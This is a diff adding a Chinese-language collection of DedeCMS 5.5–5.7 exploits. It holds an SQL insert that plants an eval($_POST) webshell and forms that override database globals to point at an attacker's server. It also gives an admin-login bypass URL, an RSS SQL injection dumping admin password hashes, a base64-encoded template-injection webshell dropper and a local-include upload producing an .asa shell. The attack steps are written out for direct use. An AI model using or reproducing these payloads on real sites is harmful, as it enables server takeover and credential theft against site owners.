@@ -1,0 +1,65 @@
+///////////
+DedeCMS 5.7圈子XSS跨站可拿WebShell 
+
+简要描述：创建圈子和编辑圈子时未对圈子的描述内容进行过滤。可以插入外部JS文件引用。管理员在查看后台圈子列表时中招。运行外部JS文件从而修改站点配置。允许上传php,asp文件等。
+
+
+////////////////////////
+dedecms,如果是5.5版本在这data/common.inc就可以找到root名字和密码
+
+
+
+////////
+DedeCms v5.6-5.7 get wenshell
+
+必须准备好自己的dede数据库，然后插入数据：
+
+insert into dede_mytag(aid,normbody) values(1,'{dede:php}$fp = @fopen("1.php", \'a\');@fwrite($fp, \'<?phpeval($_POST[c])?>\');echo "OK";@fclose($fp);{/dede:php}');  
+再用下面表单提交，shell 就在同目录下 1.php。原理自己研究
+ <form action="" method="post" name="QuickSearch" id="QuickSearch" onsubmit="addaction();"><input type="text" value="http://www.laod.org/plus/mytag_js.php?aid=1" name="doaction" style="width:400"><br /><input type="text" value="dbhost" name="_COOKIE[GLOBALS][cfg_dbhost]" style="width:400"><br /><input type="text" value="dbuser" name="_COOKIE[GLOBALS][cfg_dbuser]" style="width:400"><br /><input type="text" value="dbpwd" name="_COOKIE[GLOBALS][cfg_dbpwd]" style="width:400"><br /><input type="text" value="dbname" name="_COOKIE[GLOBALS][cfg_dbname]" style="width:400"><br /><input type="text" value="dede_" name="_COOKIE[GLOBALS][cfg_dbprefix]" style="width:400"><br /><input type="text" value="true" name="nocache" style="width:400"><input type="submit" value="提交" name="QuickSearchBtn"><br /></form><script>function addaction(){ document.QuickSearch.action=document.QuickSearch.doaction.value;}</script>
+
+
+////////
+DedeCms v5.6-5.7 爆严重安全漏洞 免账号密码直接进入后台
+
+入侵步骤如下：
+
+http://www.xx.com/织梦网站后台/login.php?dopost=login&validate=dcug&userid=admin&pwd=inimda&_POST[GLOBALS][cfg_dbhost]=116.255.183.90&_POST[GLOBALS][cfg_dbuser]=root&_POST[GLOBALS][cfg_dbpwd]=r0t0&_POST[GLOBALS][cfg_dbname]=root
+
+    把上面dcug改为当前的验证码，即可直接进入网站后台。
+
+////////////////////////////////
+
+dedecms 5.6 RSS订阅页面注入漏洞0day及防范
+uploads/plus/rss.php?tid=1&_Cs[][1]=1&_Cs[2%29%29%20AND%20%22%27%22%20AND%20updatexml%281,%28SELECT%20CONCAT%280x5b,uname,0x3a,MID%28pwd,4,16%29,0x5d%29%20FROM%20dede_admin%29,1%29%23%27][0]=1
+
+ 
+
+
+
+////////////////////////////
+
+说下利用方法：注册会员，上传软件：本地地址中填入
+a{/dede:link}{dede:toby57 name\="']=0;phpinfo();//"}x{/dede:toby57}发表后查看或修改即可执行phpinfo。
+利用代码获取webshell 防黑网：
+ a{/dede:link}{dede:toby57 name\="']=0;fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz5iYWlkdQ));//"}x{/dede:toby57}
+ 原文地址:http://www.zzfhw.com/wenzhang/html/fangheishow-20533.html
+ 
+
+
+///////////////////////////
+
+DedeCmsV5.6 本地包含0day
+http://www.hxhack.com/bbs/read.php?tid-382369-keyword-DedeCms.html
+
+之前就发现了这本地包含的利用方法。
+<form action="http://localhost:8090/plus/carbuyaction.php?dopost=return&action=xxx&code=../../include/dialog/select_soft_post" method="post" enctype="multipart/form-data" name="QuickSearch" id="QuickSearch">
+<input type="hidden" name="newname" value="1.asa">
+<input type="file" name="uploadfile">
+<input type="submit" value="搜索" name="QuickSearchBtn">
+</form>
+
+
+上传一个图片木马（只改后辍名为图片类型就行），即可在网站根目录生成 1.asa 文
+
+
